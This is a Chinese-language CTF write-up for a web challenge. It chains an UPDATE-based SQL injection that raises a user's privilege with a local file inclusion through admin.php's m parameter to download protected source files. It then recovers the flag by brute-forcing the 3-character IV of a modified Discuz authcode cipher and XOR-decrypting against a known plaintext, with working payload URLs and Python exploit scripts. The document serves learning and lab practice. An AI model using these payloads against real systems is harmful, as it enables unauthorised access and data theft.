# 三个白帽挑战之我是李雷雷我在寻找韩梅梅系列3——writeup

进入，发现index.php既可登录也可注册，随便试了一下admin/admin还真能登录，后来证实其他人注册的。。

user.php可以修改资料，测试了一下sex字段可以注入，本地测试发现update注入又这样的特性

```
update users set sex=[injection_here] where id = 1;

```

这个语句中[injection_here]部分，如果插入的是一个字段的名称，若这个字段存在，那么返回1,否则返回0.经过http参数传入的都是字符串，除非特别要求不会转换为数字，这里性别是用0和1表示的恰好符合这个条件。不过测试了好久没有结果。第二天出了第一个hint，按照页面提示操作。访问admin.php，发现

```
Your power is too low.

```

所以构造

```
update users set sex=1,power=1 where id = 1;

```

出现了文件管理选项，点进去发现有两个文件。test.php,welcome.php，随便点个文件发现是个下载的功能，文件是http://url/file/download.php，显然要在这里做文章，发现可以下载本目录下的文件，但是不能下载download.php，也不能下载别的目录的文件，检测到连续的两个小数点或者出现了斜杠都会提示非法操作，这就很尴尬了。

仔细看了看所有可以控制的参数，发现admin.php的m参数是这样的

```
http://url/admin.php?m=filemanager

```

猜测这里存在任意文件读取，不过和admin.php不在同一个目录， 也不知道这个当前目录名称是什么，于是不管当前目录名称，直接跨。

```
http://url/admin.php?m=../index

```

经过截断是失效的

不过真的返回首页了，那么一处可以下载当前目录的文件，一处可以包含任意的php文件,两处结合可以出现什么样的火花呢？

猜测download.php的源代码

### download.php

```
<?php
$file=$_GET['f'];
if(stripos($file,'..')||stripos($file,'/')){
    print "Illeagle opperation!";
}else if(!file_get_contents($file)){
    print "file not found";
}else{
    header('Content-Type:file/documents'); //忘了咋写了。。。乱写一个类型
    header('Content-Disposition: attachment; filename="'.$file.'"');
    header('Content-Length:'.filesize($file));
    readfile(dirname(__FILE__).$file);
}
?>

```

### admin.php(这个后来下载下来的，直接粘帖过来。。)

```
<?php 
require_once('inc/common.php');
if ($_SESSION['power'] == 1){
    if (isset($_GET['m'])) {
        $model = "model/" . $_GET['m'] . ".php";
        if (!is_file($model)){
            echo "Model not exist!";
            exit; 
        } else {
            include_once($model);
        }
    }
} else {
    exit("Error, your power is too low.");
}
?>

```

这样的话，我们只需要把download.php给包含进去，就能改变目录限制啦～最终payload

```
http://url/admin.php?m=../file/download&f=admin.php

```

可以看到直接下载下来了。。

后来给了hint3,下载flag.php（实际上看到群里有人讨论了一下。。猜到了这个文件，后来还是hint了），于是下载下来看

```
<?php
require_once('inc/common.php');
require_once('authcode.php');
echo "where is the flag?";
$flag = authcode('4da1JE+SVphprnaoZJlJTsXKmi+hkEFTlkrbShMA6Uq5npWavTX8vFAh3yGYDf6OcbZePTLJIT+rB2sHzmPO2tuVQ','DECODE',$authkey);
?>

```

### authcode.php

```
<?php
function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {  
   // 动态密匙长度，相同的明文会生成不同密文就是依靠动态密匙  
   $ckey_length = 3;  

   // 密匙  
   $key = md5($key ? $key : $GLOBALS['discuz_auth_key']);  

   // 密匙a会参与加解密  
   $keya = md5(substr($key, 0, 16));  
   // 密匙b会用来做数据完整性验证  
   $keyb = md5(substr($key, 16, 16));  
   // 密匙c用于变化生成的密文  
   $keyc = $ckey_length?($operation == 'DECODE' ? substr($string, 0, $ckey_length): 
substr(hash('sha256', microtime()), -$ckey_length)) : '';  
   // 参与运算的密匙  
   $cryptkey = $keya.md5($keya.$keyc);  
   $key_length = strlen($cryptkey);  
   // 明文，前10位用来保存时间戳，解密时验证数据有效性，10到26位用来保存$keyb(密匙b)，解密时会通过这个密匙验证数据完整性  
   // 如果是解码的话，会从第$ckey_length位开始，因为密文前$ckey_length位保存 动态密匙，以保证解密正确  
   $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : 
sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;  
   $string_length = strlen($string);  
   $result = '';  
   $box = range(0, 255);  
   $rndkey = array();  
   // 产生密匙簿  
   for($i = 0; $i <= 255; $i++) {  
     $rndkey[$i] = ord($cryptkey[$i % $key_length]);  
   }  
   // 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上对并不会增加密文的强度  
   for($j = $i = 0; $i < 256; $i++) {  
     $j = ($j + $box[$i] + $rndkey[$i]) % 256;  
     $tmp = $box[$i];  
     $box[$i] = $box[$j];  
     $box[$j] = $tmp;  
   }  
   // 核心加解密部分  
   for($a = $j = $i = 0; $i < $string_length; $i++) {  
     $a = ($a + 1) % 256;  
     $j = ($j + $box[$a]) % 256;  
     $tmp = $box[$a];  
     $box[$a] = $box[$j];  
     $box[$j] = $tmp;  
     // 从密匙簿得出密匙进行异或，再转成字符  
     $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));  
   }  
   if($operation == 'DECODE') {  
     // substr($result, 0, 10) == 0 验证数据有效性  
     // substr($result, 0, 10) - time() > 0 验证数据有效性  
     // substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16) 验证数据完整性  
     // 验证数据有效性，请看未加密明文的格式  
     if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && 
substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {  
       return substr($result, 26);
     } else {  
       return '';  
     }  
   } else {  
     // 把动态密匙保存在密文里，这也是为什么同样的明文，生产不同密文后能解密的原因  
     // 因为加密后的密文可能是一些特殊字符，复制过程可能会丢失，所以用base64编码  
     return $keyc.str_replace('=', '', base64_encode($result));  
   }  
}
?>

```

至于common.php，因为无法跨过这个目录限制，只能包含进去，而没办法下载下来，显而易见key就在common.php里，直接给也没意思了，想办法解。

这个密码簿形成很复杂我也勉强看看，发现keya和keyb都基本拿不到，keyc可以发现和时间有关，是当前时间戳的sha256的前三个字符，而解密也用到了keyc,那么keyc必定被包含在密文中，否则无法解密，通读代码发现最后密文确实拼接了keyc的前三位，这是唯一的突破口。

google了一下discuz authcode 缺陷，发现有人指出这个实现的流密码的IV部分太短了，只有四位。而题目给的这个修改版更是只有3位，那么想办法爆破出来就行了，因为keya和keyb都是固定的，生成密码簿只需要做到keya，keyb，keyc都相同就能生成相同的密码簿，注意到之前下载的test.php的内容

```
<?php 
require_once(dirname(__FILE__).'/../inc/common.php');
require_once(dirname(__FILE__).'/../authcode.php');
if ($_SESSION['power'] == 1){
    $test = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
    echo authcode($test,'ENCODE',$authkey);
} else {
    exit("Error, your power is too low.");
}
?>

```

提供了一组明文，那么不断的访问这个页面就可以得到密文，爆破前三位，当前三位相同的时候流密码所使用的key也就相同了，以下是简单的爆破脚本

### web.py

```
import requests
url1 = 'http://408ffe393d342329a.jie.sangebaimao.com/file/test.php'
url2 = 'http://408ffe393d342329a.jie.sangebaimao.com/index.php'
url3 = 'http://408ffe393d342329a.jie.sangebaimao.com/user.php'
s = requests.session()
data = {'username':'admin','password':'admin','submit':'login'}
res=s.post(url2,data=data);
c=s.get(url1)
while c.content[0:3]!='4da':
    c=s.get(url1)
    print c.content[0:3]

print c.content

```

因为只有三位大概三四分钟就爆破出来一个符合条件的密文。回头看看authcode.php中加密函数的关键内容。

```
for($a = $j = $i = 0; $i < $string_length; $i++) {  
    $a = ($a + 1) % 256;  
    $j = ($j + $box[$a]) % 256;  
    $tmp = $box[$a];  
    $box[$a] = $box[$j];  
    $box[$j] = $tmp;  
    // 从密匙簿得出密匙进行异或，再转成字符  
    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));  
}  

```

可见，密文（这里还没把keyc拼接上去）的每一个字符都是通过一次xor运算得到的。而xor的另一个操作数是固定不变的。那么通过两次xor就能解出明文了。但是这样还不行，我们再分析一下密文的构成。

```
$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : 
sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;  

return $keyc.str_replace('=', '', base64_encode($result));

```

所以目标就很明确喽，获得的密文，前三位是动态密钥，接着26位如果密钥相同也就是固定不变的，真正的密文从第29位开始，我这里去掉了密文的前三位，补全了等号，再做的解密。

### exp.py

```
import base64
flagcode='1JE+SVphprnaoZJlJTsXKmi+hkEFTlkrbShMA6Uq5npWavTX8vFAh3yGYDf6OcbZePTLJIT+rB2sHzmPO2tuVQ=='
testcode='1JE+SVphprnaoZMwdTdAfTy5hRlRHlspMHwQWPdxqCgEY/nV4uAQwTCcJjyge8HOK6eYL9/28l61TX/dNzAIf3R7wDnRqqFsj5chZoMsnjjvy1UbpdRiEg=='
test='1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
testcode_b64decode=base64.b64decode(testcode)[26:]
flagcode_b64decode=base64.b64decode(flagcode)[26:]
flag=''
for i in range(0,len(flagcode_b64decode)):
    flag+=chr(ord(flagcode_b64decode[i])^(ord(testcode_b64decode[i])^ord(test[i])))

print flag

```

得到flag

`miao{de142af548c3b52fd754c1c29a100b67}`